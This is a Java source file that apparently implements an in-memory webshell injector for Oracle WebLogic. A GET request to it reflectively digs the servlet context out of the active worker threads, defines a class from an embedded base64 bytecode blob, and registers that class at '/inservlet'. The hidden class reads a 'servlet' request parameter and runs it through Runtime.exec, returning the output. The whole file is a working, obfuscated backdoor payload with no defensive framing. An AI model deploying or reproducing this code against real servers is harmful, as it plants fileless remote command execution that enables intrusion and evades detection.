package com.axisx;

import sun.misc.BASE64Decoder;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class InjectServletByServlet extends HttpServlet {
    private final String URI = "/inservlet";

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        try {
            Object context=getContext();
            // 名为TestServlet，接收参数为servlet
            String FilterBase64 = "yv66vgAAADQAkAoAHABYBwBZBwBaCABbCwACAFwKABsAXQsAAwBeCgBfAGAHAGEKAGIAYwoAYgBkCgBlAGYHAGcKAA0AaAcAaQoADwBqBwBrCgARAFgKAA8AbAcAbQoAFABYCgAUAG4IAG8KABQAcAoAEQBxCgARAHAHAHIHAHMBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEADUxUZXN0U2VydmxldDsBAARpbml0AQAgKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRDb25maWc7KVYBAA1zZXJ2bGV0Q29uZmlnAQAdTGphdmF4L3NlcnZsZXQvU2VydmxldENvbmZpZzsBAApFeGNlcHRpb25zBwB0AQAHc2VydmljZQEAQChMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7KVYBAAZyZXN1bHQBABJMamF2YS9sYW5nL1N0cmluZzsBAA5zZXJ2bGV0UmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAANyZXEBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAARyZXNwAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEAA2NtZAEADVN0YWNrTWFwVGFibGUHAHIHAHUHAHYHAFkHAFoHAHcHAGEHAHgBAAtDb21tYW5kRXhlYwEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQACcnQBABNMamF2YS9sYW5nL1J1bnRpbWU7AQAEcHJvYwEAE0xqYXZhL2xhbmcvUHJvY2VzczsBAAZzdGRlcnIBABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAANpc3IBABtMamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcjsBAAJicgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEABGxpbmUBAAJzYgEAGExqYXZhL2xhbmcvU3RyaW5nQnVmZmVyOwcAeQcAegcAewcAZwcAaQcAawEAB2Rlc3Ryb3kBAApTb3VyY2VGaWxlAQAQVGVzdFNlcnZsZXQuamF2YQwAHQAeAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAHc2VydmxldAwAfABBDABAAEEMAH0AfgcAfwwAgACBAQATamF2YS9sYW5nL0V4Y2VwdGlvbgcAeQwAggCDDACEAIUHAHoMAIYAhwEAGWphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXIMAB0AiAEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIMAB0AiQEAFmphdmEvbGFuZy9TdHJpbmdCdWZmZXIMAIoAiwEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDACMAI0BAAEKDACOAIsMAIwAjwEAC1Rlc3RTZXJ2bGV0AQAeamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0AQAeamF2YXgvc2VydmxldC9TZXJ2bGV0RXhjZXB0aW9uAQAcamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdAEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlAQAQamF2YS9sYW5nL1N0cmluZwEAE2phdmEvaW8vSU9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEAEWphdmEvbGFuZy9Qcm9jZXNzAQATamF2YS9pby9JbnB1dFN0cmVhbQEADGdldFBhcmFtZXRlcgEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACHRvU3RyaW5nAQAsKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjsAIQAbABwAAAAAAAUAAQAdAB4AAQAfAAAALwABAAEAAAAFKrcAAbEAAAACACAAAAAGAAEAAAANACEAAAAMAAEAAAAFACIAIwAAAAEAJAAlAAIAHwAAADUAAAACAAAAAbEAAAACACAAAAAGAAEAAAAOACEAAAAWAAIAAAABACIAIwAAAAAAAQAmACcAAQAoAAAABAABACkAAQAqACsAAgAfAAAA3gACAAcAAAAvK8AAAk4swAADOgQtEgS5AAUCADoFKhkFtgAGOgYZBLkABwEAGQa2AAinAAU6BrEAAQAVACkALAAJAAMAIAAAACIACAAAABEABQASAAsAEwAVABUAHQAWACkAGQAsABcALgAaACEAAABIAAcAHQAMACwALQAGAAAALwAiACMAAAAAAC8ALgAvAAEAAAAvADAAMQACAAUAKgAyADMAAwALACQANAA1AAQAFQAaADYALQAFADcAAAAfAAL/ACwABgcAOAcAOQcAOgcAOwcAPAcAPQABBwA+AQAoAAAABgACACkAPwABAEAAQQACAB8AAAEpAAMACQAAAGC4AApNLCu2AAtOLbYADDoEuwANWRkEtwAOOgW7AA9ZGQW3ABA6BgE6B7sAEVm3ABI6CBkGtgATWToHxgAgGQi7ABRZtwAVGQe2ABYSF7YAFrYAGLYAGVen/9sZCLYAGrAAAAADACAAAAAqAAoAAAAcAAQAHQAKAB4AEAAfABsAIAAmACEAKQAiADIAIwA9ACQAWgAmACEAAABcAAkAAABgACIAIwAAAAAAYAA2AC0AAQAEAFwAQgBDAAIACgBWAEQARQADABAAUABGAEcABAAbAEUASABJAAUAJgA6AEoASwAGACkANwBMAC0ABwAyAC4ATQBOAAgANwAAACUAAv8AMgAJBwA4BwA9BwBPBwBQBwBRBwBSBwBTBwA9BwBUAAAnACgAAAAEAAEACQABAFUAHgABAB8AAAArAAAAAQAAAAGxAAAAAgAgAAAABgABAAAAKAAhAAAADAABAAAAAQAiACMAAAABAFYAAAACAFc=";
            byte[] FilterClass = new BASE64Decoder().decodeBuffer(FilterBase64);
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
            defineClass.setAccessible(true);

            Field f5 = context.getClass().getDeclaredField("classLoader");
            f5.setAccessible(true);
            Object o5 = f5.get(context);

            Class<?> filter_class = (Class<?>) defineClass.invoke(o5, FilterClass, 0, FilterClass.length);

            Method m1=context.getClass().getDeclaredMethod("getServletMapping");
            m1.setAccessible(true);
            Object servletMapping=m1.invoke(context);

            Constructor<?> c1=Class.forName("weblogic.servlet.internal.ServletStubImpl").getDeclaredConstructor(String.class, Class.class,context.getClass());
            c1.setAccessible(true);
            Object Stub=c1.newInstance(URI,filter_class,context);

            Constructor<?> c2 = Class.forName("weblogic.servlet.internal.URLMatchHelper").getDeclaredConstructor(String.class, Stub.getClass());
            c2.setAccessible(true);
            Object Url = c2.newInstance(URI, Stub);

            Method mget=servletMapping.getClass().getDeclaredMethod("get",String.class);
            mget.setAccessible(true);
            if(mget.invoke(servletMapping,URI)==null){
                Method mput=servletMapping.getClass().getDeclaredMethod("put",String.class,Object.class);
                mput.setAccessible(true);
                mput.invoke(servletMapping,URI,Url);

            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static synchronized Object getContext() throws NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
        ThreadGroup threadGroup=Thread.currentThread().getThreadGroup();
        Field field=threadGroup.getClass().getDeclaredField("threads");
        field.setAccessible(true);
        Thread[] threads=(Thread[])field.get(threadGroup);
        for (Thread thread : threads) {
            if (thread.getName().contains("ACTIVE")) {
                Field f1 = thread.getClass().getDeclaredField("workEntry");
                f1.setAccessible(true);
                Object o1 = f1.get(thread);

                Field f2 = o1.getClass().getDeclaredField("connectionHandler");
                f2.setAccessible(true);
                Object o2 = f2.get(o1);

                Field f3 = o2.getClass().getDeclaredField("request");
                f3.setAccessible(true);
                Object o3 = f3.get(o2);

                Field f4 = o3.getClass().getDeclaredField("context");
                f4.setAccessible(true);
                Object o4 = f4.get(o3);
                return o4;
            }
        }
        return null;
    }
}
